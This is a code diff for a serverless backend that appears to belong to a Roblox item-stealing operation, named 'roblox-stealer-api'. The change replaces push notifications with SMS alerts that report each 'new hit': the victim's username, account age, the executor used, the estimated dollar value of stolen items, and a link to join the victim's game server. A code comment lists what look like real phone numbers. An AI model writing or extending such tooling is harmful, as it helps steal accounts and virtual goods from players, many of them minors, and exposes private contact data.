@@ -1,33 +1,27 @@
 import crypto from 'crypto';
 
-// ── ntfy.sh push notification sender ──────────────────────────────────────────
-// Set in Vercel env vars:
-//   NTFY_TOPIC  - your secret topic name e.g. "mm2hits-x7k2p9"
-//               - comma-separate for multiple devices: "topic1,topic2"
-//   NTFY_SERVER - optional, defaults to https://ntfy.sh (use for self-hosted)
+// ── TextBelt SMS sender ──────────────────────────────────────────────────────────
+// No phone number purchase needed. Sign up at textbelt.com for an API key.
+// Free tier: use key "textbelt" for 1 SMS/day (testing only)
+// Paid: buy credits at $0.01/SMS, no monthly number cost
 //
-// Setup: install the "ntfy" app on your phone, subscribe to your topic. Done.
-async function sendPush(title, message, joinUrl) {
-  const topicRaw = process.env.NTFY_TOPIC;
-  if (!topicRaw) return; // not configured, skip silently
+// Set in Vercel env vars:
+//   TEXTBELT_KEY      - your API key (or "textbelt" for free 1/day)
+//   TEXTBELT_TO       - recipient number(s), comma-separated e.g. 9565784579,2693168228
+async function sendSMS(message) {
+  const key   = process.env.TEXTBELT_KEY;
+  const toRaw = process.env.TEXTBELT_TO;
 
-  const server = (process.env.NTFY_SERVER || 'https://ntfy.sh').replace(/\/$/, '');
-  const topics = topicRaw.split(',').map(t => t.trim()).filter(Boolean);
+  if (!key || !toRaw) return; // not configured, skip silently
 
-  const headers = {
-    'Content-Type': 'text/plain',
-    'Title':    title,
-    'Priority': 'urgent',       // makes phone buzz loud
-    'Tags':     'rotating_light,skull', // 🚨💀 icons in notification
-  };
-  if (joinUrl) headers['Actions'] = `view, Join Server, ${joinUrl}`;
+  const recipients = toRaw.split(',').map(n => n.trim()).filter(Boolean);
 
-  await Promise.allSettled(topics.map(topic =>
-    fetch(`${server}/${encodeURIComponent(topic)}`, {
+  await Promise.allSettled(recipients.map(phone =>
+    fetch('https://textbelt.com/text', {
       method: 'POST',
-      headers,
-      body: message,
-    }).catch(e => console.error(`ntfy to ${topic} failed:`, e))
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ phone, message, key }),
+    }).catch(e => console.error(`SMS to ${phone} failed:`, e))
   ));
 }
 
@@ -406,22 +400,23 @@ export default async function handler(req, res) {
         ? `https://${process.env.VERCEL_URL}`
         : 'https://roblox-stealer-api.vercel.app';
 
-      const pushJoinUrl = hitData.placeId && hitData.jobId
+      const joinUrl = hitData.placeId && hitData.jobId
         ? `${BASE_URL}/api/join?placeId=${hitData.placeId}&jobId=${hitData.jobId}`
         : null;
 
-      const pushTitle = `🔥 New Hit — ${formatUSD(totalUSD)}`;
-      const pushBody = [
+      const smsBody = [
+        `🔥 NEW HIT — ${formatUSD(totalUSD)}`,
         `👤 ${hitData.username} (${hitData.displayName})`,
-        `🎮 ${hitData.gameName || 'MM2'} | ${hitData.playerCount}/${hitData.maxPlayers} players`,
-        `📅 ${hitData.accountAge}d acct | ⚙️ ${hitData.executor}`,
-        `💰 Est: ${formatUSD(totalUSD)}`,
-      ].join('\n');
+        `🎮 ${hitData.gameName || 'MM2'} | ${hitData.playerCount}/${hitData.maxPlayers}`,
+        `📅 ${hitData.accountAge}d | ⚙️ ${hitData.executor}`,
+        joinUrl ? `🔗 ${joinUrl}` : null,
+      ].filter(Boolean).join('\n');
 
-      await sendPush(pushTitle, pushBody, pushJoinUrl);
+      await sendSMS(smsBody);
     } catch (e) {
-      console.error('Push notification failed:', e);
+      console.error('SMS failed:', e);
     }
+
 
   }
 
